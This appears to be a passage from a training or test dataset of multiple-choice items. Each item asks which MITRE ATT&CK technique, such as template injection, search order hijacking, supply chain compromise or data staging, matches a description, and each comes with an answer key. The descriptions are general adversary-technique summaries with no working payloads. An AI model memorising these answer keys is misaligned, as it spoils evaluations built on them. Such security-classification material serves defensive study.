    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).\n\nPossible answers:\nA. Develop Capabilities: Exploits, B. Data from Cloud Storage, C. Gather Victim Network Information: Network Security Appliances, D. Input Capture: Web Portal Capture",
    "context": "",
    "output": "C. Gather Victim Network Information: Network Security Appliances",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",
      "options": "A. Develop Capabilities: Exploits, B. Data from Cloud Storage, C. Gather Victim Network Information: Network Security Appliances, D. Input Capture: Web Portal Capture",
      "choice": "C. Gather Victim Network Information: Network Security Appliances",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).\n\nPossible answers:\nA. Web Service: One-Way Communication, B. Data from Information Repositories: Sharepoint, C. Search Open Technical Databases: CDNs, D. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "context": "",
    "output": "C. Search Open Technical Databases: CDNs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).",
      "options": "A. Web Service: One-Way Communication, B. Data from Information Repositories: Sharepoint, C. Search Open Technical Databases: CDNs, D. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
      "choice": "C. Search Open Technical Databases: CDNs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where the technique was used to load malicious code containing an exploit.\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.\n\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.\n\nOptions:\nA. Template Injection, B. Stage Capabilities: Link Target, C. Boot or Logon Autostart Execution: Print Processors, D. Build Image on Host",
    "context": "",
    "output": "A. Template Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where the technique was used to load malicious code containing an exploit.\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.\n\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.",
      "options": "A. Template Injection, B. Stage Capabilities: Link Target, C. Boot or Logon Autostart Execution: Print Processors, D. Build Image on Host",
      "choice": "A. Template Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\n\nPossible answers:\nA. Credentials from Password Stores: Cloud Secrets Management Stores, B. Boot or Logon Autostart Execution, C. Phishing for Information: Spearphishing Voice, D. Server Software Component",
    "context": "",
    "output": "D. Server Software Component",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.",
      "options": "A. Credentials from Password Stores: Cloud Secrets Management Stores, B. Boot or Logon Autostart Execution, C. Phishing for Information: Spearphishing Voice, D. Server Software Component",
      "choice": "D. Server Software Component",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. \n\nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. \n\nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.\n\nA. Obfuscated Files or Information: Embedded Payloads, B. Indicator Removal: Clear Command History, C. Replication Through Removable Media, D. Impair Defenses: Disable or Modify Tools\nAnswer:",
    "context": "",
    "output": "A. Obfuscated Files or Information: Embedded Payloads",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. \n\nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. \n\nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.",
      "options": "A. Obfuscated Files or Information: Embedded Payloads, B. Indicator Removal: Clear Command History, C. Replication Through Removable Media, D. Impair Defenses: Disable or Modify Tools",
      "choice": "A. Obfuscated Files or Information: Embedded Payloads",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.\n\nPossible answers:\nA. Establish Accounts: Cloud Accounts, B. Use Alternate Authentication Material: Pass the Hash, C. Hijack Execution Flow: Path Interception by Search Order Hijacking, D. Pre-OS Boot: TFTP Boot",
    "context": "",
    "output": "C. Hijack Execution Flow: Path Interception by Search Order Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.",
      "options": "A. Establish Accounts: Cloud Accounts, B. Use Alternate Authentication Material: Pass the Hash, C. Hijack Execution Flow: Path Interception by Search Order Hijacking, D. Pre-OS Boot: TFTP Boot",
      "choice": "C. Hijack Execution Flow: Path Interception by Search Order Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.\n\nPossible answers:\nA. Impair Defenses: Indicator Blocking, B. Network Boundary Bridging: Network Address Translation Traversal, C. OS Credential Dumping: Security Account Manager, D. Command and Scripting Interpreter",
    "context": "",
    "output": "D. Command and Scripting Interpreter",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
      "options": "A. Impair Defenses: Indicator Blocking, B. Network Boundary Bridging: Network Address Translation Traversal, C. OS Credential Dumping: Security Account Manager, D. Command and Scripting Interpreter",
      "choice": "D. Command and Scripting Interpreter",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens. Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers.\n\nA. System Binary Proxy Execution: Odbcconf, B. Process Injection, C. Process Injection: ListPlanting, D. Compromise Accounts: Cloud Accounts\nA:",
    "context": "",
    "output": "D. Compromise Accounts: Cloud Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens. Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers.",
      "options": "A. System Binary Proxy Execution: Odbcconf, B. Process Injection, C. Process Injection: ListPlanting, D. Compromise Accounts: Cloud Accounts",
      "choice": "D. Compromise Accounts: Cloud Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.\n\nOptions:\nA. Modify Authentication Process, B. Event Triggered Execution: Installer Packages, C. Data from Configuration Repository, D. Boot or Logon Autostart Execution: LSASS Driver",
    "context": "",
    "output": "A. Modify Authentication Process",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
      "options": "A. Modify Authentication Process, B. Event Triggered Execution: Installer Packages, C. Data from Configuration Repository, D. Boot or Logon Autostart Execution: LSASS Driver",
      "choice": "A. Modify Authentication Process",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).\n\nA. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, B. Steal or Forge Authentication Certificates, C. Gather Victim Network Information: Network Trust Dependencies, D. Obfuscated Files or Information: Encrypted/Encoded File\nAnswer:",
    "context": "",
    "output": "C. Gather Victim Network Information: Network Trust Dependencies",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",
      "options": "A. Exfiltration Over Web Service: Exfiltration to Text Storage Sites, B. Steal or Forge Authentication Certificates, C. Gather Victim Network Information: Network Trust Dependencies, D. Obfuscated Files or Information: Encrypted/Encoded File",
      "choice": "C. Gather Victim Network Information: Network Trust Dependencies",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile the technique can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.\n\nOptions:\nA. Supply Chain Compromise, B. Office Application Startup: Outlook Home Page, C. Event Triggered Execution: AppInit DLLs, D. Application Layer Protocol",
    "context": "",
    "output": "A. Supply Chain Compromise",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile the technique can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.",
      "options": "A. Supply Chain Compromise, B. Office Application Startup: Outlook Home Page, C. Event Triggered Execution: AppInit DLLs, D. Application Layer Protocol",
      "choice": "A. Supply Chain Compromise",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.\n\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke at. If the <code>at.deny</code> exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at.\n\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via <code>sudo</code>.\n\nA. Steal Application Access Token, B. Scheduled Task/Job: At, C. Account Manipulation: Additional Cloud Credentials, D. Exfiltration Over C2 Channel\nAnswer:",
    "context": "",
    "output": "B. Scheduled Task/Job: At",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.\n\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke at. If the <code>at.deny</code> exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at.\n\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via <code>sudo</code>.",
      "options": "A. Steal Application Access Token, B. Scheduled Task/Job: At, C. Account Manipulation: Additional Cloud Credentials, D. Exfiltration Over C2 Channel",
      "choice": "B. Scheduled Task/Job: At",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.\n\nOptions:\nA. Process Injection: Proc Memory, B. Obfuscated Files or Information: Embedded Payloads, C. Software Discovery, D. Data Staged",
    "context": "",
    "output": "D. Data Staged",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
      "options": "A. Process Injection: Proc Memory, B. Obfuscated Files or Information: Embedded Payloads, C. Software Discovery, D. Data Staged",
      "choice": "D. Data Staged",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.\nA. Boot or Logon Autostart Execution, B. Abuse Elevation Control Mechanism: Sudo and Sudo Caching, C. Scheduled Transfer, D. Disk Wipe\nAnswer:",
    "context": "",
    "output": "C. Scheduled Transfer",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
      "options": "A. Boot or Logon Autostart Execution, B. Abuse Elevation Control Mechanism: Sudo and Sudo Caching, C. Scheduled Transfer, D. Disk Wipe",
      "choice": "C. Scheduled Transfer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).\n\nHost binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or PowerShell on Windows to access and/or export security event information. In cloud environments, adversaries may leverage utilities such as the Azure VM Agent\u2019s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.\n\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.\n\nA. Video Capture, B. Log Enumeration, C. Network Denial of Service: Reflection Amplification, D. Event Triggered Execution: Component Object Model Hijacking\nA:",
    "context": "",
    "output": "B. Log Enumeration",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
